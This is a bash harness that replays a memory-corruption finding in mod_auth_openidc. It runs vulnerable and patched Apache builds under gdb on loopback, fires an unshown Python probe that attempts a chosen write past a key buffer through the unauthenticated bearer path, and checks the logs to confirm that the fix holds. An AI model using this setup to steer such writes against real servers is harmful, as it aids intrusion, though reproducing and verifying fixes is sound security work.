#!/bin/bash
# W219b: push the A128GCM chosen write past cek+0x90 (two pointer-shaped
# values seen in W219) in the real unauthenticated bearer lane. One fresh
# gdb-started Apache per case; loopback 127.0.0.1:18444 / :18445 only.
set -eu
T=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
W2=$(CDPATH= cd -- "$T/.." && pwd)
GDBPIDS=""
PASS=0
FAIL=0
mkdir -p "$T/evidence" "$T/run" "$T/cache" "$T/html"
ln -sfn "$W2/mod_auth_openidc-fixed" "$T/mod_auth_openidc-fixed"
sed -e "s|@W2@|$W2|g" -e "s|@T@|$T|g" "$T/apache-w219.conf" > "$T/apache-vuln.run.conf"
sed -e "s|@HERE@|$T|g" "$W2/apache-oauth-bearer-fixed.conf" > "$T/apache-fixed.run.conf"

cleanup() {
    if [ -f "$T/apache.pid" ]; then kill "$(cat "$T/apache.pid")" 2>/dev/null || true; rm -f "$T/apache.pid"; fi
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
}
trap cleanup EXIT INT TERM
check() {
    if [ "$2" = "$3" ]; then PASS=$((PASS + 1)); else FAIL=$((FAIL + 1)); fi
    printf 'CHECK %-28s observed=%s expected=%s\n' "$1" "$2" "$3"
}
start() {
    conf=$1; cmd=$2; out=$3; port=$4
    timeout 90 gdb -q -batch -x "$cmd" --args /usr/sbin/apache2 -f "$conf" -X > "$out" 2>&1 &
    GDBPIDS="$GDBPIDS $!"
    for i in $(seq 1 200); do
        if ss -ltn | grep -q ":$port "; then return 0; fi
        sleep 0.2
    done
    echo "LISTENER_NOT_READY=$port" >&2
    exit 2
}
stop() {
    for p in $GDBPIDS; do kill "$p" 2>/dev/null || true; wait "$p" 2>/dev/null || true; done
    GDBPIDS=""
    sleep 1
}

if [ "$(ss -ltn | grep -cE ':1844[45] ' || true)" -ne 0 ]; then echo PORTS_BUSY >&2; exit 3; fi
: > "$T/evidence/oauth-bearer-fixed-apache_error.log"

for mode in long zero base safe; do
    sed "s|@LOG@|$T/evidence/gdb-b-$mode.log|" "$T/gdb-w219.cmd" > "$T/gdb-b-$mode.cmd"
    start "$T/apache-vuln.run.conf" "$T/gdb-b-$mode.cmd" "$T/evidence/stdout-b-$mode.log" 18444
    W2_PORT=18444 W2_TAG="w219b-$mode" timeout 30 python3 "$T/probe-w219b.py" "$mode" \
        > "$T/evidence/probe-b-$mode.log" 2>&1 || echo "PROBE_FAILED=$mode" >> "$T/evidence/probe-b-failures.log"
    sleep 2
    stop
    L="$T/evidence/gdb-b-$mode.log"
    check "${mode}_UNWRAP" "$(grep -c W219_UNWRAP_KEY_REACHED "$L" || true)" 1
    check "${mode}_DUMP" "$(grep -c W219_POST_UNWRAP "$L" || true)" 1
done

sed "s|@HERE@|$T|g" "$W2/gdb-oauth-bearer-fixed.cmd" > "$T/gdb-b-fixed.cmd"
start "$T/apache-fixed.run.conf" "$T/gdb-b-fixed.cmd" "$T/evidence/stdout-b-fixed.log" 18445
W2_PORT=18445 W2_TAG=w219b-fixed timeout 30 python3 "$T/probe-w219b.py" long \
    > "$T/evidence/probe-b-fixed.log" 2>&1 || echo "PROBE_FAILED=fixed" >> "$T/evidence/probe-b-failures.log"
sleep 2
stop

FLOG="$T/evidence/oauth-bearer-fixed-gdb.log"
check FIXED_KW176 "$(grep -c 'W2BF_AES_KW_DECRYPT_REACHED raw_len=176' "$FLOG" || true)" 1
check FIXED_NO_UNWRAP "$(grep -c W2BF_AES_UNWRAP_KEY_REACHED "$FLOG" || true)" 0
check FIXED_REJECT599 "$(grep -c 'line: 599' "$T/evidence/oauth-bearer-fixed-apache_error.log" || true)" 1

for mode in long zero base safe; do
    printf '%s: %s\n' "$mode" "$(grep -m1 'W219_POST_UNWRAP' "$T/evidence/gdb-b-$mode.log" || true)"
    printf '%s signals=%s\n' "$mode" "$(grep -c 'Program received signal' "$T/evidence/gdb-b-$mode.log" || true)"
done
printf 'REPLAY_W219B: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
ss -ltn | grep -E ':1844[45] ' || echo NO_LISTENER_LEFT
[ "$FAIL" -eq 0 ]
